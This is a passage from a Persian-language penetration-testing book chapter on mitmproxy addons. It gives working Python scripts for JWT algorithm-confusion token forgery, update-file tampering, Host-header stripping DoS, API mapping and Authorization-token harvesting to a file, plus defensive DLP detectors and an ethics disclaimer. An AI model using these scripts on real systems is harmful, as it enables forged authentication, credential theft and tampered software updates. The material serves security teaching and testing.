- **سناریوی استفاده:** در یک تست نفوذ، یک API با JWT محافظت می‌شود. ما با mitmproxy ترافیک را رهگیری می‌کنیم، توکن JWT را استخراج کرده، نوع الگوریتم آن را تغییر داده و با کلید عمومی سرور امضا می‌کنیم.

- **مکانیزم عملکرد:** اسکریپت ما به طور خودکار توکن‌های JWT را در هدر Authorization شناسایی کرده، سرآیند و payload را دیکد کرده، الگوریتم را به HS256 تغییر می‌دهد و با کلید عمومی یک امضای جدید می‌سازد.

- **روش پیاده‌سازی:**
```python
import jwt
import base64
import json
import logging
from mitmproxy import http

class JWTAlgorithmConfusion:
    def __init__(self):
        #بارگذاری کلید عمومی سرور (که به صورت فرضی از قبل دریافت شده)
        self.public_key = b"-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A...\n-----END PUBLIC KEY-----"

    def request(self, flow: http.HTTPFlow):
        auth = flow.request.headers.get("Authorization", "")
        if "Bearer" in auth:
            token = auth.split("Bearer ")[1]
            try:
                #دیکد کردن توکن بدون تأیید امضا برای خواندن سرآیند
                header = jwt.get_unverified_header(token)
                if header.get("alg") == "RS256":
                    logging.info("RS256 JWT detected. Attempting algorithm confusion...")
                    payload = jwt.decode(token, options={"verify_signature": False})
                    #Change Algorithm to HS256 & sign with Public Key
                    new_token = jwt.encode(payload, self.public_key, algorithm="HS256")
                    flow.request.headers["Authorization"] = f"Bearer {new_token}"
                    logging.info("JWT algorithm confusion attack applied.")
            except Exception as e:
                logging.error(f"JWT confusion failed: {e}")

addons = [JWTAlgorithmConfusion()]
```

###### Attack 11: Software Update Hijacking
- **تئوری حمله:** بسیاری از نرم‌افزارها به‌روزرسانی‌های خود را از طریق HTTP دانلود می‌کنند. اگر این فرآیند به درستی با امضای دیجیتال محافظت نشده باشد، مهاجم می‌تواند با حمله مرد میانی، فایل به‌روزرسانی را با یک نسخه آلوده جایگزین کند. این حمله می‌تواند بسیار خطرناک باشد، زیرا نرم‌افزار معمولاً با دسترسی بالا اجرا می‌شود .

- **سناریوی استفاده:** یک نرم‌افزار قدیمی در شبکه آزمایشگاهی ما وجود دارد که به‌روزرسانی‌های خود را از یک سرور داخلی دریافت می‌کند. می‌خواهیم نشان دهیم که چگونه یک مهاجم می‌تواند این فرآیند را ربوده و بجای آن یک درپشتی تزریق کند.

- **مکانیزم عملکرد:** اسکریپت ما دانلود فایل‌های با پسوند `zip.` یا `msi.` را با استفاده از فیلتر `u~` رهگیری می‌کند. محتوای فایل اصلی را خوانده، Payload خود را به آن الصاق کرده (در یک سناریوی واقعی این کار نیازمند مهندسی معکوس دقیق است) و طول محتوا را تصحیح می‌کند.

- **روش پیاده‌سازی:**
```python
import logging
from mitmproxy import http

class UpdateHijacker:
    def response(self, flow: http.HTTPFlow):
        if flow.request.path.endswith("/update.zip"):
            logging.warning(f"[!] Intercepted software update: {flow.request.pretty_url}")
            #Add a readme.txt to ZIP File
            extra_data = b"PK\x03\x04..." #New ZIP File Header
            flow.response.content += extra_data
            flow.response.headers["Content-Length"] = str(len(flow.response.content))
            logging.info("Malicious payload appended to update file.")

addons = [UpdateHijacker()]
```

- **هشدار جدی:** این یک مثال مفهومی است. در عمل، آلوده‌سازی یک فایل اجرایی یا آرشیو بدون آسیب‌زدن به ساختار آن، نیازمند دانش تخصصی در مورد فرمت فایل هدف است.

###### Attack 12: Shadow API Discovery
- **تئوری حمله:** برنامه‌های موبایل و وب مدرن اغلب از API های داخلی استفاده می‌کنند که مستندسازی نشده‌اند. هدف ما در این "حمله" که بیشتر یک تکنیک تحلیل و شناسایی است، رهگیری تمام ترافیک یک برنامه و یافتن این APIهای پنهان است. این کار می‌تواند API های مدیریتی، آسیب‌پذیری‌ها یا عملکردهای مخفی را آشکار کند .

- **سناریوی استفاده:** یک برنامه موبایل بانکی برای تحلیل امنیتی به ما داده شده است. می‌خواهیم تمام درخواست‌های API که برنامه به سرورهایش ارسال می‌کند را نقشه‌برداری کنیم.

- **مکانیزم عملکرد:** اسکریپت ما تمام درخواست‌های HTTP/HTTPS را رهگیری کرده و URL، متد و پارامترهای آن‌ها را در یک فایل با فرمت JSON ذخیره می‌کند. این فایل سپس می‌تواند برای تحلیل و مستندسازی خودکار API استفاده شود.
    
- **روش پیاده‌سازی:**
```python
import json, logging
from mitmproxy import http, ctx

class APIDiscovery:
    def __init__(self):
        self.api_endpoints = []
        self.output_file = "discovered_apis.json"

    def request(self, flow: http.HTTPFlow):
        #Only save requests which have /api/ in URL
        if "/api/" in flow.request.path:
            endpoint_info = {
                "url": flow.request.pretty_url,
                "method": flow.request.method,
                "host": flow.request.pretty_host,
            }
            self.api_endpoints.append(endpoint_info)
            logging.info(f"Discovered API: {flow.request.method} {flow.request.pretty_url}")

    def done(self):
        #Save results in a JSON File
        with open(self.output_file, "w") as f:
            json.dump(self.api_endpoints, f, indent=4)
        logging.info(f"API Discovery finished. Total endpoints found: {len(self.api_endpoints)}")

addons = [APIDiscovery()]
```
###### Attack 13: Header Stripping DoS
- **تئوری حمله:** این یک حمله از نوع انکار سرویس (DoS) در لایه Application و بسیار هدفمند است. برخی از سرورهای وب یا WAFها به شدت به وجود هدرهای خاصی مانند `Host` یا هدرهای امنیتی خاص وابسته هستند. ما می‌توانیم با حذف این هدرها از درخواست‌های سالم، باعث شویم سرور نتواند درخواست را پردازش کرده و خطا برگرداند، یا حتی رفتارهای پیش‌بینی‌نشده‌ای از خود نشان دهد که باعث ایجاد اختلال در کارایی سرور میشود.

- **سناریوی استفاده:** یک سرور IIS قدیمی در شبکه آزمایشگاهی داریم. می‌خواهیم تست کنیم که اگر هدر `Host` را از درخواست‌ها حذف کنیم، سرور چه واکنشی نشان می‌دهد.
    
- **مکانیزم عملکرد:** اسکریپت ما فقط هدر `Host` را از درخواست حذف می‌کند.
    
- **روش پیاده‌سازی:**
```python
class HostHeaderStripper:
    def request(self, flow):
        if "Host" in flow.request.headers:
            logging.info(f"Stripping Host header for: {flow.request.url}")
            del flow.request.headers["Host"]

addons = [HostHeaderStripper()]
```
##### Bonus 1: Useful Scripts
در این بخش چندین اسکریپت Addon کاربردی را بصورت خلاصه بررسی میکنیم:
###### 1: Authentication Token Extractor
- **توضیح:** تحلیل خودکار هدرهای Authorization برای شکار توکن‌ها 
- **کاربرد:** تست امنیت (Credential Leakage Detection) و تحلیل APIهای موبایل.
```python
from mitmproxy import http, ctx

class TokenHunter:
    def request(self, flow: http.HTTPFlow):
        auth = flow.request.headers.get("Authorization", "")
        if auth:
            ctx.log.alert(f"[+] Token Found in {flow.request.host}: {auth}")
            with open("tokens.txt", "a") as f:
                f.write(f"{flow.request.pretty_url}\t{auth}\n")

addons = [TokenHunter()]
```

###### 2: Custom Header Injector
- **توضیح:** افزودن هدر دلخواه جهت تست امنیت سرورها
- **کاربرد:** شناسایی و ارزیابی مکانیزم‌های Filtering, WAF, Logging.

```python
class HeaderInjector:
    def request(self, flow):
        flow.request.headers["X-Security-Test"] = "InjectedByMITM"
        ctx.log.info(f"Injected header into {flow.request.host}")

addons = [HeaderInjector()]
```

###### 3: Keyword Data Leak Detector
- **توضیح:** جست‌وجوی خودکار کلمات حساس در پاسخ یا درخواست
- **کاربرد:** در Blue Team برای کشف نشت داده‌ها (Data Leakage Prevention).

```python
import re
from mitmproxy import ctx

keywords = ["password", "apikey", "token", "secret"]

class DLPChecker:
    def response(self, flow):
        data = flow.response.get_text()
        for kw in keywords:
            if re.search(kw, data, re.IGNORECASE):
                ctx.log.warn(f"[DLP] Keyword '{kw}' found in {flow.request.url}")

addons = [DLPChecker()]
```

###### 4: Latency Profiler
- **توضیح:** محاسبه زمان Round‑trip برای هر تراکنش و ایجاد گزارش تأخیر
- **کاربرد:** تست کارایی برنامه‌های وب و اندازه‌گیری تأخیر در پاسخ‌گویی.

```python
import time
from mitmproxy import ctx

class LatencyStats:
    def request(self, flow):
        flow.request.timestamp_start = time.time()

    def response(self, flow):
        latency = time.time() - flow.request.timestamp_start
        ctx.log.info(f"[Latency] {flow.request.host} took {latency * 1000:.2f} ms")

addons = [LatencyStats()]
```

###### 5: Threat Intelligence Logger
- **توضیح:** ثبت اطلاعات حساس از Request و Response
- **کاربرد:** ارسال لاگ ترافیک به سرور SIEM یا Splunk برای تحلیل بلادرنگ فعالیت‌ها

```python
import requests
from mitmproxy import ctx

class SIEMReporter:
    SIEM_URL = "http://192.168.100.20:5000/collect"

    def response(self, flow):
        record = {
            "host": flow.request.host,
            "status": flow.response.status_code,
            "url": flow.request.pretty_url
        }
        try:
            requests.post(self.SIEM_URL, json=record, timeout=2)
        except Exception as e:
            ctx.log.error(f"SIEM push failed: {e}")

addons = [SIEMReporter()]

```
##### Bonus 2: Create Custom Addons for mitmproxy
در این بخش چندین افزونه پرکاربرد را برای mitmproxy توسعه میدهیم. با فراگیری این مطلب ما از یک مصرف کننده به یک خالق یا تولید کننده تبدیل میشویم و میتوانیم ابزار mitmproxy را توسعه ببخشیم.
###### Addon 1: Smart Recorder and Replayer
- **هدف:** این افزونه نه تنها ترافیک را ذخیره می‌کند، بلکه آن را به صورت خودکار و بر اساس تطابق الگوی URL بازپخش می‌کند. این کار برای فریب برنامه‌های موبایل یا کلاینت‌های سنگین که انتظار پاسخ‌های خاصی دارند، بسیار مفید است.
 
- **سناریوی استفاده:** یک برنامه موبایل را تحلیل می‌کنیم که یک درخواست API به `/api/v1/config` می‌فرستد. پس از اولین بار، می‌خواهیم پاسخ آن همیشه همان باشد و به سرور واقعی نرود تا بتوانیم رفتار برنامه را در شرایط آفلاین یا با پاسخ‌های دستکاری‌شده تست کنیم.

- **مکانیزم عملکرد:** افزونه یک دیکشنری در حافظه برای نگهداری جفت‌های `url -> response_data` می‌سازد. در قلاب `request`، اگر URL در دیکشنری موجود بود، یک پاسخ از پیش ذخیره‌شده را بازمی‌گرداند. در قلاب `response`، اگر URL جدید بود، پاسخ آن را در دیکشنری ذخیره می‌کند.
 
- **روش پیاده‌سازی:**
```python
import logging
from mitmproxy import http

class SmartRecorder:
    def __init__(self):
        self.cache = {}  #حافظه کش برای نگهداری پاسخ‌ها

    def request(self, flow: http.HTTPFlow):
        url = flow.request.url
        #اگر پاسخ این آدرس را قبلاً ذخیره کرده باشیم، آن را پخش می‌کنیم
        if url in self.cache:
            logging.info(f"Replaying cached response for: {url}")
            cached_response = self.cache[url]
            #ساخت یک پاسخ جدید از روی داد‌ه‌های ذخیره‌شده
            flow.response = http.Response.make(
                cached_response["status"],
                cached_response["content"],
                cached_response["headers"]
            )

    def response(self, flow: http.HTTPFlow):
        url = flow.request.url
        #اگر پاسخی از سرور آمد و آدرس جدید بود، آن را ذخیره می‌کنیم
        if url not in self.cache:
            logging.info(f"Caching response for: {url}")
            self.cache[url] = {
                "status": flow.response.status_code,
                "headers": dict(flow.response.headers),
                "content": flow.response.content,
            }
addons = [SmartRecorder()]
```

- **توضیح:** این اسکریپت یک کش ساده در حافظه می‌سازد. اولین باری که یک URL خاص دیده شود، پاسخ آن ذخیره می‌شود. از دفعات بعد، مستقیماً از کش پاسخ داده می‌شود و درخواست به شبکه ارسال نمی‌شود.
###### Addon 2: Create DLP (Data Loss Prevention) System
- **هدف:** این افزونه از دید تیم آبی (Blue Team) طراحی شده است. هدف آن، بازرسی محتوای خروجی (پاسخ‌ها) و هشدار در صورت یافتن الگوهای اطلاعات حساس مانند شماره کارت اعتباری یا شماره ملی است.

- **سناریوی استفاده:** فرض کنیم یک برنامه تحت وب داریم و می‌خواهیم مطمئن شویم که به طور تصادفی اطلاعات حساس کاربران را در پاسخ‌های API فاش نمی‌کند. این افزونه به عنوان یک لایه امنیتی روی پراکسی توسعه‌دهنده عمل می‌کند.

- **مکانیزم عملکرد:** اسکریپت ما در قلاب `response` فعال می‌شود. محتوای `flow.response.text` را با یک عبارت باقاعده (Regex) که برای تطابق با الگوی شماره کارت‌های اعتباری Visa/Mastercard طراحی شده است، اسکن می‌کند. در صورت یافتن، یک هشدار امنیتی سطح بالا ثبت می‌کند.

- **روش پیاده‌سازی:**
```python
import re
import logging

class DLPMonitor:
    def __init__(self):
        #Regex Pattern to Find 16 digits Numbers - Credit Cards (/Visa/MC)
        self.cc_pattern = re.compile(r'\b(?:\d[ -]*?){13,16}\b')

    def response(self, flow):
        #Only HTML & TXT Responses
        if flow.response and "text" in flow.response.headers.get("content-type", ""):
            findings = self.cc_pattern.findall(flow.response.text)
            if findings:
                #Submit Security Alert
                logging.warning(
                    f"[SECURITY ALERT] Potential credit card leak detected in response from {flow.request.pretty_url}. "
                    f"Found patterns: {', '.join(findings)}"
                )
addons = [DLPMonitor()]
```

- **توضیح:** این یک نمونه عالی از کاربرد دفاعی mitmproxy است. با این افزونه، ما یک سیستم تشخیص نشت اطلاعات (DLP) ساده ساختیم که می‌تواند در هنگام توسعه و تست برنامه‌ها، ما را از وجود مشکلات امنیتی آگاه کند. با تغییر الگوی Regex، می‌توان آن را برای شناسایی انواع دیگر داده‌های حساس (مانند شماره ملی، ایمیل و غیره) نیز گسترش داد.
##### Conclusion
در پایان این فصل، به جمع‌بندی آموخته‌های خود از ابزار قدرتمند و همه‌کاره mitmproxy می‌پردازیم. این ابزار که فراتر از یک پروکسی ساده عمل می‌کند، اکنون باید برای ما به عنوان یک پلتفرم تحلیل و دستکاری پویای ترافیک وب تثبیت شده باشد.
ابزار mitmproxy به واسطه معماری ماژولار و انعطاف‌پذیر خود، یک ابزار استاندارد در تست نفوذ برنامه‌های وب، تحلیل بدافزارها، مهندسی معکوس API ها و همچنین اشکال‌زدایی در حین توسعه نرم‌افزار است. قابلیت اصلی آن، نه فقط مشاهده غیرفعال ترافیک، بلکه توقف، ویرایش و بازپخش تعاملی جریان‌های HTTP و HTTPS است که آن را به یک سلاح ضروری در جعبه ابزار هر متخصص امنیت شبکه تبدیل کرده است.

**تأکید دوباره بر اصول اخلاقی و قانونی:** تمامی دانش و مهارتی که در این فصل با جزئیات کامل آموختیم، از مفاهیم اولیه رهگیری ترافیک گرفته تا نوشتن اسکریپت‌های پیشرفته برای تزریق محتوا، جعل هویت و تحلیل APIها، **صرفاً و منحصراً برای اهداف آموزشی، پژوهشی و توسعه مهارت‌های دفاعی طراحی شده است**. استفاده از این تکنیک‌ها و اسکریپت‌ها بر روی هر شبکه، سیستم یا برنامه‌ای بدون کسب مجوز رسمی و کتبی از مالک آن، اقدامی غیرقانونی، غیراخلاقی و مصداق بارز نفوذ مخرب است. مسئولیت کامل هرگونه سوءاستفاده از این دانش، بر عهده شخص استفاده‌کننده بوده و هیچ‌گونه ارتباطی با نویسنده و ناشر این کتاب ندارد.

**فواید یادگیری و مسیر پیش رو:** تسلط بر مباحث این فصل، جایگاه ما را در امنیت شبکه ارتقا می‌دهد:

1. **متخصص تهاجمی (Red Team):** ما اکنون می‌توانیم حملات پیچیده مرد میانی را در لایه کاربرد شبیه‌سازی کنیم، از مکانیزم‌های احراز هویت مدرن عبور کنیم و سناریوهای واقعی تهدید را برای سنجش آمادگی سازمان‌ها بازسازی نماییم.
    
2. **متخصص دفاعی (Blue Team):** ما ابزاری قدرتمند برای تحلیل بدافزارها، رمزگشایی و بازرسی ترافیک HTTPS (با نصب گواهی CA مربوطه در محیط‌های مجاز) و شناسایی نشت داده‌ها (DLP) در اختیار داریم.
    
3. **جایگاه نهایی:** ما از یک کاربر ساده ابزار به یک توسعه‌دهنده تبدیل شده‌ایم که می‌تواند برای حل مسائل خاص خود، افزونه‌های جدید بنویسد. این نقطه اوج تسلط بر یک ابزار است: دیگر مصرف‌کننده صرف نیستیم، بلکه تولیدکننده راه‌حل هستیم. با این دانش، برای ورود به فصل بعدی و بررسی ابزارهای تخصصی‌تر کاملاً آماده‌ایم.
### !